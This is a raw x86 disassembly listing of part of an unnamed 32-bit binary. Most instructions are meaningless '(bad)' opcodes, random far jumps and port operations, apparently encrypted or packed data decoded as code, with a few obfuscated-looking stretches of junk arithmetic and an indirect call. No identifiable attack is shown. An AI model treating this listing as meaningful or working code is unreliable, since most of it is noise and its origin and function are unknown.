  4112dd:	sub    BYTE PTR [esi+esi*4-0x60],dl
  4112e1:	adc    esi,ebx
  4112e3:	jmp    0xa53008ae
  4112e8:	xchg   DWORD PTR [ecx-0x27],edx
  4112eb:	pop    esi
  4112ec:	pop    edi
  4112ed:	mov    ah,0x26
  4112ef:	adc    BYTE PTR [ebp+0x65],bh
  4112f2:	inc    edx
  4112f3:	sbb    ch,BYTE PTR [esi]
  4112f5:	shl    BYTE PTR [edi],cl
  4112f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112f8:	adc    eax,DWORD PTR [ebx-0x4a]
  4112fb:	dec    ecx
  4112fc:	lds    ecx,FWORD PTR [edx+0x61]
  4112ff:	es jp  0x4112d0
  411302:	in     eax,0x7
  411304:	push   es
  411305:	hlt    
  411306:	mov    bh,0xc2
  411308:	test   eax,0x4b945dff
  41130d:	mov    ?,esi
  41130f:	xchg   edx,eax
  411310:	and    esi,eax
  411312:	or     BYTE PTR [esi+0x63],dh
  411315:	js     0x4112df
  411317:	pop    ebx
  411318:	lds    ecx,FWORD PTR [ecx+0x4d]
  41131b:	push   ebp
  41131c:	test   eax,0xa8361103
  411321:	(bad)  
  411322:	std    
  411323:	sbb    al,BYTE PTR [edi+0x362b6666]
  411329:	mov    ds:0x179981f0,eax
  41132e:	mov    gs,WORD PTR [edi]
  411330:	(bad)  
  411331:	neg    BYTE PTR [edx-0x3c253a73]
  411337:	adc    edi,DWORD PTR [esp+eax*8-0x30b33d44]
  41133e:	aad    0xce
  411340:	lea    esp,[edi+0x4c44ff11]
  411346:	and    al,BYTE PTR [eax-0x12]
  411349:	enter  0xb89a,0xce
  41134d:	fidiv  DWORD PTR [edi-0x40]
  411350:	pop    ecx
  411351:	ja     0x411341
  411353:	push   0x78
  411355:	and    al,bh
  411357:	ins    DWORD PTR es:[edi],dx
  411358:	(bad)  
  411359:	jmp    0x564e:0xfae20cea
  411360:	inc    esp
  411361:	xor    ecx,DWORD PTR [esi]
  411363:	ret    0xbba7
  411366:	sbb    ch,BYTE PTR [ebx+0x56a2782c]
  41136c:	nop
  41136d:	pop    esp
  41136e:	push   ebx
  41136f:	push   ebp
  411370:	(bad)  
  411371:	adc    eax,edi
  411373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411374:	xchg   ecx,eax
  411375:	test   al,0x1f
  411377:	mov    bh,0x74
  411379:	sbb    DWORD PTR [ebp-0x76],ecx
  41137c:	inc    esp
  41137d:	add    eax,0xc558ba8
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x1926ada1],ecx
  4113db:	push   edi
  4113dc:	add    DWORD PTR [eax+0x7e],eax
  4113df:	jle    0x4113d2
  4113e1:	jg     0x411461
  4113e3:	jle    0x41142a
  4113e5:	jns    0x4113d3
  4113e7:	mov    esp,eax
  4113e9:	inc    ecx
  4113ea:	mov    eax,0x90b3faa5
  4113ef:	add    DWORD PTR [eax+0x69],0x66
  4113f3:	xchg   esi,eax
  4113f4:	or     eax,esp
  4113f6:	cld    
  4113f7:	not    ebp
  4113f9:	repz sub ecx,edx
  4113fc:	(bad)  
  4113fd:	out    dx,eax
  4113fe:	mov    eax,0xfc00d2bf
  411403:	pop    es
  411404:	pop    ss
  411405:	int3   
  411406:	pushf  
  411407:	inc    ebx
  411408:	sbb    edi,ebp
  41140a:	mov    dh,0xb
  41140c:	push   ecx
  41140d:	rol    BYTE PTR [bp+di-0x30],cl
  411411:	dec    edx
  411412:	fldenv [eax+ebp*8]
  411415:	sub    al,0x30
  411417:	sbb    DWORD PTR [ebx+ebp*2-0x7d],esp
  41141b:	ret    
  41141c:	mov    WORD PTR [eax-0x2f],?
  41141f:	sub    ecx,DWORD PTR [edi]
  411421:	dec    ebp
  411422:	cdq    
  411423:	jo     0x411427
  411425:	mov    DWORD PTR [edi-0x182f8824],0x93ab8dad
  41142f:	fldenv [ebx+0x39749b8f]
  411435:	loop   0x4113e7
  411437:	mov    eax,ds:0x3c828c61
  41143c:	(bad)  
  41143d:	iret   
  41143e:	fld    QWORD PTR ss:[ebx]
  411441:	cmp    edx,ecx
  411443:	and    eax,0x80ce934
  411448:	js     0x411452
  41144a:	add    eax,0xd56acbd7
  41144f:	xchg   edx,eax
  411450:	fidivr DWORD PTR [esi+ebp*8]
  411453:	daa    
  411454:	sub    dl,BYTE PTR [esp+ecx*4-0x6]
  411458:	adc    DWORD PTR [eax],esi
  41145a:	sbb    DWORD PTR [ebx+0x80cc511],ebp
  411460:	addr16 out 0x44,eax
  411463:	pushf  
  411464:	mov    ah,0x5d
  411466:	mov    edi,0x2586daa6
  41146b:	mov    BYTE PTR [ebp+0x14d67c14],dl
  411471:	out    dx,al
  411472:	jmp    0x2f0ec6bf
  411477:	inc    ebp
  411478:	mov    dh,0x2d
  41147a:	sub    DWORD PTR [edi],edi
  41147c:	adc    DWORD PTR [ecx-0x3d767504],0x5d328a4e
  411486:	sar    BYTE PTR [edi+0x4f],1
  411489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148a:	mul    BYTE PTR [ebp-0x62]
  41148d:	dec    esp
  41148e:	xchg   ebp,eax
  41148f:	iret   
  411490:	or     DWORD PTR [edx+0x6921744],0x39df603f
  41149a:	mov    ebp,ecx
  41149c:	push   0x5a92b776
  4114a1:	in     eax,0x9f
  4114a3:	out    0x95,al
  4114a5:	iret   
  4114a6:	jge    0x4114c1
  4114a8:	pop    edx
  4114a9:	adc    eax,0xe0fce057
  4114ae:	into   
  4114af:	js     0x4114cf
  4114b1:	dec    edx
  4114b2:	mov    al,ds:0x28bafb4f
  4114b7:	sub    BYTE PTR [ebp+0xb8bdc7e],dl
  4114bd:	xchg   ebx,eax
  4114be:	call   0xebc7:0x3b579089
  4114c5:	outs   dx,BYTE PTR ds:[esi]
  4114c6:	in     eax,0x64
  4114c8:	sub    eax,0xd1c1c1c5
  4114cd:	push   0xffffffc2
  4114cf:	(bad)  [edx+edi*8-0x49]
  4114d3:	xchg   esp,eax
  4114d4:	(bad)  
  4114d5:	pop    esi
  4114d6:	adc    BYTE PTR [ebx-0x50],ch
  4114d9:	xor    BYTE PTR [edi-0x2],cl
  4114dc:	and    BYTE PTR [eax],dl
  4114de:	fisttp WORD PTR [edi]
  4114e0:	loope  0x4114b4
  4114e2:	mov    ebx,0xe4d3138c
  4114e7:	stc    
  4114e8:	repnz cmp eax,0x4d35ba1
  4114ee:	sbb    ebp,ebx
  4114f0:	les    esp,FWORD PTR [ebx]
  4114f2:	daa    
  4114f3:	(bad)  
  4114f4:	popa   
  4114f5:	sbb    eax,0xb68d8b64
  4114fa:	inc    esp
  4114fb:	adc    DWORD PTR [edi+0x59],edx
  4114fe:	adc    al,0x56
  411500:	push   0xffffffff
  411502:	call   0xe583b0b3
  411507:	push   esi
  411508:	push   ss
  411509:	xchg   esi,esp
  41150b:	iret   
  41150c:	scas   al,BYTE PTR es:[edi]
  41150d:	sbb    eax,esi
  41150f:	jno    0x4114f1
  411511:	pop    edx
  411512:	repz sub dh,BYTE PTR [ebp+edx*8-0xfe6ccd7]
  41151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41151b:	jo     0x4114a9
  41151d:	mov    dl,0x1d
  41151f:	xor    ebx,ecx
  411521:	jmp    0x5852:0xf3ee2fe0
  411528:	icebp  
  411529:	dec    edx
  41152a:	fcomp  DWORD PTR ds:0x14ad2037
  411530:	xchg   ebx,eax
  411531:	or     DWORD PTR [ebp-0x7bd7742d],edx
  411537:	int3   
  411538:	push   ebx
  411539:	add    esi,ebx
  41153b:	inc    ebp
  41153c:	fidivr WORD PTR [eax+0x6b4e626f]
  411542:	fcmovnb st,st(1)
  411544:	aas    
  411545:	jl     0x4115a4
  411547:	dec    ebx
  411548:	dec    eax
  411549:	xchg   BYTE PTR [ecx],dl
  41154b:	inc    ecx
  41154c:	test   bh,dh
  41154e:	out    0x5e,al
  411550:	push   0x25b0bc90
  411555:	jae    0x4114e9
  411557:	mov    eax,0xd7a62d4
  41155c:	mov    ch,0xda
  41155e:	and    esi,DWORD PTR [ecx-0x353d97]
  411564:	inc    ebp
  411565:	or     al,0xe9
  411567:	pop    edi
  411568:	cld    
  411569:	(bad)  
  41156a:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	shr    DWORD PTR [ebp-0x1b],0x42
  411585:	add    BYTE PTR [ecx+0x7e],0x7e
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115a0
  41158e:	daa    
  41158f:	cmp    al,0xf4
  411591:	mov    ebx,eax
  411593:	jge    0x411612
  411595:	jge    0x41157e
  411597:	cs mov ah,dl
  41159a:	inc    esi
  41159b:	out    dx,al
  41159c:	test   eax,0xf445e4cf
  4115a1:	add    DWORD PTR [edx+0x4d19d7ae],edi
  4115a7:	fs jl  0x4115a4
  4115aa:	out    dx,al
  4115ab:	int3   
  4115ac:	cdq    
  4115ad:	sub    al,0xdb
  4115af:	inc    edi
  4115b0:	int    0x23
  4115b2:	sub    dl,BYTE PTR [esi-0x5a18d2a5]
  4115b8:	and    eax,0xa9eed2bd
  4115bd:	inc    ebx
  4115be:	inc    ebp
  4115bf:	xchg   ecx,eax
  4115c0:	xchg   DWORD PTR [eax],eax
  4115c2:	out    0x1,eax
  4115c4:	(bad)  
  4115c5:	sbb    edx,esi
  4115c7:	fsubr  DWORD PTR [esp+edx*8]
  4115ca:	fild   DWORD PTR [edi+0x55d31c49]
  4115d0:	je     0x41160b
  4115d2:	popa   
  4115d3:	dec    eax
  4115d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d5:	mov    esi,0x9c503371
  4115da:	push   es
  4115db:	dec    eax
  4115dc:	pushf  
  4115dd:	ins    BYTE PTR es:[edi],dx
  4115de:	jmp    0xfb83:0xbd2c885b
  4115e5:	jl     0x4115f0
  4115e7:	and    al,0xc0
  4115e9:	ret    0x5605
  4115ec:	pop    es
  4115ed:	into   
  4115ee:	or     eax,0x181330f0
  4115f3:	in     al,0x13
  4115f5:	aad    0x68
  4115f7:	lods   al,BYTE PTR ds:[esi]
  4115f8:	adc    dh,BYTE PTR [edi]
  4115fa:	(bad)  
  4115fb:	aas    
  4115fc:	aad    0x7b
  4115fe:	pop    ecx
  4115ff:	ins    DWORD PTR es:[edi],dx
  411600:	fisttp DWORD PTR [ecx]
  411602:	xor    edx,DWORD PTR [ebp-0x686e3702]
  411608:	dec    edi
  411609:	mov    edx,ecx
  41160b:	push   es
  41160c:	push   esp
  41160d:	ds adc eax,0xe52a9d00
  411613:	or     ecx,ebp
  411615:	call   0x4ffdb655
  41161a:	(bad)  
  41161b:	jp     0x4115ef
  41161d:	sbb    dh,bl
  41161f:	js     0x4115fc
  411621:	pop    ecx
  411622:	test   bl,dl
  411624:	ror    BYTE PTR [eax],1
  411626:	add    esi,DWORD PTR [eax]
  411628:	arpl   WORD PTR [ebx],si
  41162a:	sahf   
  41162b:	jmp    0x7aac9b91
  411630:	cmp    eax,0x5097743
  411635:	jle    0x411630
  411637:	lods   eax,DWORD PTR ds:[esi]
  411638:	mov    esp,DWORD PTR [eax+0x34]
  41163b:	and    BYTE PTR [edx+0x6bda912e],dh
  411641:	mov    ds:0x12354be3,al
  411646:	mov    al,0xb
  411648:	push   es
  411649:	and    eax,0x8fde78d
  41164e:	adc    bl,bh
  411650:	ret    
  411651:	(bad)  
  411653:	and    ecx,edx
  411655:	call   0x51fc:0x570dd438
  41165c:	lea    eax,[ecx-0x514cb202]
  411662:	iret   
  411663:	loop   0x411600
  411665:	mov    ds:0x1913fcc5,eax
  41166a:	adc    DWORD PTR [edi],esi
  41166c:	mov    bl,0x19
  41166e:	outs   dx,BYTE PTR ds:[esi]
  41166f:	cwde   
  411670:	lea    ecx,[ebx+0x67d41661]
  411676:	inc    ebp
  411677:	ins    DWORD PTR es:[edi],dx
  411678:	ret    
  411679:	hlt    
  41167a:	pop    edx
  41167b:	repz jecxz 0x411682
  41167e:	cmp    ecx,DWORD PTR [edi]
  411680:	add    eax,ebx
  411682:	and    BYTE PTR [eax+ecx*1],ah
  411685:	pushf  
  411686:	cmp    al,0xb9
  411688:	iret   
  411689:	pusha  
  41168a:	ja     0x411660
  41168c:	push   ds
  41168d:	mov    ss,esp
  41168f:	sub    DWORD PTR [ebx-0x3a],0x12
  411693:	in     eax,0xd4
  411695:	lock cmp DWORD PTR [eax],edx
  411698:	enter  0x1f,0x8
  41169c:	sar    BYTE PTR [edi+esi*8],cl
  41169f:	lods   al,BYTE PTR ds:[esi]
  4116a0:	and    eax,DWORD PTR gs:[edx-0x451e8896]
  4116a7:	dec    ecx
  4116a8:	jge    0x411704
  4116aa:	xlat   BYTE PTR ds:[ebx]
  4116ab:	sahf   
  4116ac:	mov    ebx,0x1fad27cd
  4116b1:	leave  
  4116b2:	xchg   ebp,esi
  4116b4:	jecxz  0x4116fd
  4116b6:	pop    ebp
  4116b7:	dec    ebx
  4116b8:	xchg   esi,eax
  4116b9:	cmp    ah,BYTE PTR [ecx]
  4116bb:	cld    
  4116bc:	cmc    
  4116bd:	loop   0x41164e
  4116bf:	adc    eax,0xc29dbc94
  4116c4:	scas   al,BYTE PTR es:[edi]
  4116c5:	dec    edx
  4116c6:	adc    cl,BYTE PTR [esi]
  4116c8:	xchg   esp,eax
  4116c9:	mov    ds:0x2fda272e,eax
  4116ce:	pop    eax
  4116cf:	cs and al,0xa3
  4116d2:	ficom  WORD PTR es:[esi+0x65]
  4116d6:	xchg   ecx,eax
  4116d7:	add    eax,0x1c9ce73
  4116dc:	outs   dx,BYTE PTR ds:[esi]
  4116dd:	jle    0x411726
  4116df:	fcomp  DWORD PTR [ecx]
  4116e1:	imul   DWORD PTR [edx+0x176915c7]
  4116e7:	add    eax,0x674e3c44
  4116ec:	test   DWORD PTR [esi],0x57ebb0c8
  4116f2:	pop    esi
  4116f3:	mov    ebp,0x1962971a
  4116f8:	adc    ebx,DWORD PTR [edx+0x7c]
  4116fb:	fstp   st(3)
  4116fd:	(bad)  
  4116ff:	xchg   ebp,eax
  411700:	stc    
  411701:	jmp    0x599f:0x46963280
  411708:	out    dx,al
  411709:	in     al,dx
  41170a:	push   0x104d8b79
  41170f:	add    eax,esi
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x8cc6411a
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x4117a2
  41178e:	pop    eax
  41178f:	in     eax,dx
  411790:	xchg   edi,eax
  411791:	in     al,dx
  411792:	jae    0x41174b
  411794:	pop    ebp
  411795:	mov    bl,0xe2
  411797:	je     0x411722
  411799:	push   edx
  41179a:	sub    eax,0x758a1cf1
  41179f:	inc    ebx
  4117a0:	and    ebx,DWORD PTR [eax]
  4117a2:	or     eax,0x9d59100a
  4117a7:	mov    ecx,0xc48bf598
  4117ac:	sub    al,0x21
  4117ae:	jg     0x4117eb
  4117b0:	sub    DWORD PTR [edx+esi*4+0x46],eax
  4117b4:	loope  0x411741
  4117b6:	das    
  4117b7:	pushf  
  4117b8:	sbb    BYTE PTR [ecx+0x2c],al
  4117bb:	mov    edi,0xb4f7aa91
  4117c0:	repz adc esi,0xd81db799
  4117c7:	xor    DWORD PTR [ecx-0x357032c9],edi
  4117cd:	int3   
  4117ce:	sbb    dl,BYTE PTR [eax+0x62]
  4117d1:	mov    al,0xac
  4117d3:	cwde   
  4117d4:	xchg   esp,eax
  4117d5:	dec    eax
  4117d6:	icebp  
  4117d7:	retf   
  4117d8:	popa   
  4117d9:	scas   al,BYTE PTR es:[edi]
  4117da:	(bad)  
  4117db:	daa    
  4117dc:	jo     0x4117a2
  4117de:	and    DWORD PTR [ebp-0x65],esi
  4117e1:	retf   
  4117e2:	sub    BYTE PTR [esi+0x6d],dh
  4117e5:	dec    ecx
  4117e6:	ret    0xfbf7
  4117e9:	ins    BYTE PTR es:[edi],dx
  4117ea:	adc    al,0xf5
  4117ec:	mov    ds:0xebbd567e,al
  4117f1:	scas   al,BYTE PTR es:[edi]
  4117f2:	mov    cl,0x7d
  4117f4:	aaa    
  4117f5:	or     edi,DWORD PTR [esi+0x30fa4b61]
  4117fb:	cld    
  4117fc:	sbb    DWORD PTR ds:0x9f4f9e57,ebp
  411802:	mov    cl,0xa5
  411804:	and    al,BYTE PTR [edi]
  411806:	push   ebx
  411807:	scas   al,BYTE PTR es:[edi]
  411808:	mov    ecx,0x3c267d35
  41180d:	rcr    DWORD PTR [eax],cl
  41180f:	call   DWORD PTR [edx]
  411811:	call   0x686f:0x3a01faf3
  411818:	push   edi
  411819:	stos   BYTE PTR es:[edi],al
  41181a:	not    DWORD PTR [edi-0x395df23c]
  411820:	ret    0x8521
  411823:	(bad)  [ebx+0x58]
  411826:	inc    esp
  411827:	push   ds
  411828:	mov    al,ds:0x6fd711e1
  41182d:	xor    ebp,DWORD PTR [ebx+0x2f]
  411830:	or     edi,eax
  411832:	cmp    DWORD PTR [eax-0x13408f91],edi
  411838:	cmp    eax,esi
  41183a:	jae    0x41186a
  41183c:	push   edi
  41183d:	mov    edx,esp
  41183f:	popf   
  411840:	mov    al,0x44
  411842:	and    dh,bh
  411844:	xor    al,0xdd
  411846:	add    eax,0x72514607
  41184b:	jae    0x4117cd
  41184d:	mov    ds:0xb3ab25fa,eax
  411852:	cmp    al,0xf4
  411855:	shr    BYTE PTR [ecx-0x19],cl
  411858:	jg     0x4118be
  41185a:	xchg   esi,eax
  41185b:	inc    esi
  41185c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41185d:	pop    eax
  41185e:	sub    esp,ebp
  411860:	pusha  
  411861:	dec    esi
  411862:	mov    dl,0x7b
  411864:	push   edx
  411865:	fadd   st,st(1)
  411867:	sbb    ah,dl
  411869:	or     cl,dh
  41186b:	sub    BYTE PTR [ebp+0x78a47cb4],cl
  411871:	push   edx
  411872:	sbb    ch,BYTE PTR [edx]
  411874:	scas   eax,DWORD PTR es:[edi]
  411875:	pop    es
  411876:	inc    ebp
  411877:	xchg   ebx,eax
  411878:	in     eax,0xee
  41187a:	mov    edx,0x1da4eca4
  41187f:	adc    ch,BYTE PTR [eax+eax*4+0xdb29641]
  411886:	push   esp
  411887:	add    DWORD PTR [edi],edi
  411889:	es mov bl,0xe6
  41188c:	mov    BYTE PTR [edi-0x7503c944],cl
  411892:	sbb    BYTE PTR [esi+0x38b2c633],ah
  411898:	inc    eax
  411899:	mov    cl,0xc7
  41189b:	retf   0x92b0
  41189e:	rcr    BYTE PTR [edi],0xac
  4118a1:	inc    ecx
  4118a2:	jnp    0x4118eb
  4118a4:	repz jno 0x4118fb
  4118a7:	pushf  
  4118a8:	mov    dl,0x16
  4118aa:	cwde   
  4118ab:	icebp  
  4118ac:	loope  0x4118f4
  4118ae:	jo     0x411915
  4118b0:	lods   eax,DWORD PTR ds:[esi]
  4118b1:	push   cs
  4118b2:	dec    ebp
  4118b3:	and    al,0x1a
  4118b5:	and    BYTE PTR [ebp-0x7d31cf23],bl
  4118bb:	shr    BYTE PTR [edi-0x67],0xf2
  4118bf:	and    al,0x5a
  4118c1:	push   ss
  4118c2:	daa    
  4118c3:	into   
  4118c4:	pop    esi
  4118c5:	rol    esp,1
  4118c7:	sub    cl,BYTE PTR [ebx]
  4118c9:	jb     0x411880
  4118cb:	ror    BYTE PTR [edi],cl
  4118cd:	call   0xa3d9:0xadf9d72d
  4118d4:	inc    ebx
  4118d5:	jae    0x41187c
  4118d7:	in     eax,dx
  4118d8:	aad    0xf2
  4118da:	dec    ebx
  4118db:	or     dl,BYTE PTR [eax-0x16]
  4118de:	sub    ebp,esi
  4118e0:	pop    ebp
  4118e1:	retf   0x23cf
  4118e4:	aaa    
  4118e5:	in     eax,dx
  4118e6:	mov    esi,0x7f3267cc
  4118eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118ec:	xchg   edx,eax
  4118ed:	sub    al,BYTE PTR [eax+0x2b]
  4118f0:	sti    
  4118f1:	repz cmp cl,ah
  4118f4:	xchg   esi,eax
  4118f5:	push   eax
  4118f6:	pop    ecx
  4118f7:	pop    es
  4118f8:	sti    
  4118f9:	cs inc esp
  4118fb:	push   ebx
  4118fc:	sub    edx,edi
  4118fe:	mov    ecx,0x68221042
  411903:	lea    edi,[ebp+0x5f]
  411906:	cmp    BYTE PTR [ebx-0x7b82f953],0xeb
  41190d:	and    DWORD PTR [esi+0x5790b15c],esi
  411913:	pop    ebx
  411914:	fnstcw WORD PTR [ecx+0x61]
  411917:	scas   eax,DWORD PTR es:[edi]
  411918:	add    eax,0xbcfc3857
  41191d:	iret   
  41191e:	scas   eax,DWORD PTR es:[edi]
  41191f:	(bad)  
  411920:	int3   
  411921:	xor    cl,al
  411923:	outs   dx,DWORD PTR ds:[esi]
  411924:	into   
  411925:	repnz mov bl,BYTE PTR [ecx]
  411928:	daa    
  411929:	aas    
  41192a:	sbb    DWORD PTR [ebp-0x160d0746],esi
  411930:	jns    0x411930
  411932:	pop    eax
  411933:	add    al,BYTE PTR [ecx]
  411935:	and    eax,0x2380b50c
  41193a:	adc    al,0x80
  41193c:	gs pop esi
  41193e:	pop    esi
  41193f:	cmp    DWORD PTR [esp+edi*8],esi
  411942:	pushf  
  411943:	mov    esp,DWORD PTR [edi+0x5b]
  411946:	repnz in al,0xb
  411949:	aas    
  41194a:	mov    DWORD PTR [esi-0x7b8cbf39],ebp
  411950:	jp     0x4119bc
  411952:	mov    cs,WORD PTR [ebx+0x60]
  411955:	(bad)  
  411956:	jmp    0x6572f4a8
  41195b:	repnz adc eax,0x968f863a
  411961:	pop    ecx
  411962:	jecxz  0x41199d
  411964:	adc    esi,DWORD PTR [esi]
  411966:	mov    bh,0x3
  411968:	mov    dl,BYTE PTR [ecx]
  41196a:	iret   
  41196b:	pop    es
  41196c:	bound  edx,QWORD PTR [edi-0x5]
  41196f:	pop    ebp
  411970:	out    0xe9,al
  411972:	mov    edi,0x9da115ef
  411977:	std    
  411978:	das    
  411979:	inc    esi
  41197a:	in     eax,dx
  41197b:	xchg   BYTE PTR [eax+0x5166866e],dl
  411981:	cdq    
  411982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411983:	scas   eax,DWORD PTR es:[edi]
  411984:	les    edi,FWORD PTR [edi+eax*2+0x57]
  411988:	mov    BYTE PTR [edx],ch
  41198a:	ficomp WORD PTR [edi+edx*4-0x3d]
  41198e:	inc    esp
  41198f:	mov    dh,0x4e
  411991:	push   eax
  411992:	xlat   BYTE PTR ds:[ebx]
  411993:	push   esi
  411994:	in     al,0xe7
  411996:	adc    DWORD PTR [ebp+0x55],ecx
  411999:	mov    al,0x3e
  41199b:	imul   ecx,esi,0xffffffce
  41199e:	inc    edi
  41199f:	inc    ecx
  4119a0:	aaa    
  4119a1:	call   0x9bb1:0xe983084a
  4119a8:	adc    esi,DWORD PTR [ebp+0x1d]
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x1a
  411a13:	xchg   ebx,eax
  411a14:	mov    DWORD PTR [ecx+0x7e7e4d25],0x7e7e7c10
  411a1e:	xchg   edi,eax
  411a1f:	jo     0x411a29
  411a21:	addr16 addr16 push ss
  411a24:	xor    al,0x99
  411a26:	jmp    0x411aa0
  411a28:	fmulp  st(1),st
  411a2a:	pop    edx
  411a2b:	ds retf 
  411a2d:	inc    edx
  411a2e:	(bad)  
  411a2f:	retf   
  411a30:	pop    ebp
  411a31:	test   al,0x50
  411a33:	outs   dx,DWORD PTR ds:[esi]
  411a34:	(bad)  
  411a35:	or     eax,0x71bf887a
  411a3a:	rol    ah,0xc9
  411a3d:	xor    DWORD PTR [edi+0x6d18edc3],esp
  411a43:	ret    0xb853
  411a46:	xor    eax,0x3128997
  411a4b:	mov    ebx,0x7668eff7
  411a50:	or     ah,dl
  411a52:	and    edx,DWORD PTR [eax]
  411a54:	push   edi
  411a55:	mov    ebp,0x74988285
  411a5a:	aaa    
  411a5b:	cs loop 0x4119e2
  411a5e:	add    BYTE PTR gs:[edx+0x757ce0c9],bl
  411a65:	cmp    eax,0xbf5f46e2
  411a6a:	lea    edi,[edi]
  411a6c:	pop    esp
  411a6d:	das    
  411a6e:	and    esi,DWORD PTR [eax-0x4addd05f]
  411a74:	pusha  
  411a75:	out    0x6,al
  411a77:	xlat   BYTE PTR ds:[ebx]
  411a78:	outs   dx,BYTE PTR ds:[esi]
  411a79:	push   0xffffffba
  411a7b:	pop    ebx
  411a7c:	leave  
  411a7d:	mov    bl,0x19
  411a7f:	cs aaa 
  411a81:	jg     0x411aac
  411a83:	inc    eax
  411a84:	jge    0x411a1a
  411a86:	inc    edx
  411a87:	out    dx,al
  411a88:	push   ss
  411a89:	sbb    DWORD PTR [ecx],ebp
  411a8b:	push   0x6dbac0a1
  411a90:	rol    eax,1
  411a92:	mov    al,ds:0xa402812a
  411a97:	pop    edi
  411a98:	mov    DWORD PTR fs:[edx+0x5f],ebx
  411a9c:	imul   esi,DWORD PTR [eax],0xffffffce
  411a9f:	aas    
  411aa0:	pusha  
  411aa1:	in     eax,0x51
  411aa3:	xor    BYTE PTR [edx-0x26],ch
  411aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa7:	js     0x411aef
  411aa9:	lds    edx,FWORD PTR [edi+0x827e4a4]
  411aaf:	cld    
  411ab0:	std    
  411ab1:	and    BYTE PTR [ebx+0x5ecf3312],al
  411ab7:	jne    0x411ad7
  411ab9:	retf   
  411aba:	jns    0x411a88
  411abc:	jg     0x411a75
  411abe:	cs into 
  411ac0:	adc    dl,bl
  411ac2:	inc    edx
  411ac3:	sub    bh,BYTE PTR gs:[ecx-0x18752722]
  411aca:	call   0xbb5bd6f0
  411acf:	mov    DWORD PTR [eax-0x5c],eax
  411ad2:	sahf   
  411ad3:	and    DWORD PTR [edx],ebx
  411ad5:	imul   DWORD PTR ds:[eax+0x63add75]
  411adc:	(bad)  
  411add:	cld    
  411ade:	inc    edx
  411adf:	in     al,0xe9
  411ae1:	fwait
  411ae2:	pop    ds
  411ae3:	popa   
  411ae4:	ins    DWORD PTR es:[edi],dx
  411ae5:	leave  
  411ae6:	push   0xffffffff
  411ae8:	mov    al,0x46
  411aea:	dec    edi
  411aeb:	bound  ecx,QWORD PTR [ebp-0x745d06d0]
  411af1:	sbb    ecx,DWORD PTR [ecx+0x3cd50c6b]
  411af7:	xor    al,0x96
